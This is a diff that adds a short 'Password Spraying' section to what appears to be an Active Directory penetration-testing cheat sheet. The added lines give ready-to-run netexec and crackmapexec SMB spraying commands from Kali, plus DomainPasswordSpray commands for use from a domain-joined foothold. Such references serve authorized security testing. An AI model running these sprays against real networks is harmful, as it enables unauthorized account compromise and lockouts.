@@ -146,3 +146,32 @@ Get-NetUser
   ```powershell
   Get-NetUser | Where-Object { $_.SamAccountName -eq "UserName" }
   ```
+# **Password Spraying**
+
+#### **From Kali Linux**
+
+1. **Using `Netexec` (A Newer Version of Crackmapexec):**
+   ```bash
+   netexec smb <IP-RANGE> -u users.txt -p 'Password123' --continue-on-success
+   ```
+
+2. **Using `Crackmapexec`:**
+   ```bash
+   crackmapexec smb <IP-RANGE> -u users.txt -p 'Password123' --continue-on-success
+   ```
+
+---
+
+#### **From a Foothold on a Domain-Joined Windows Host**
+
+- **Tool: [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)**
+
+1. **Import the Module:**
+   ```powershell
+   Import-Module .\DomainPasswordSpray.ps1
+   ```
+
+2. **Perform Password Spraying:**
+   ```powershell
+   Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+   ```
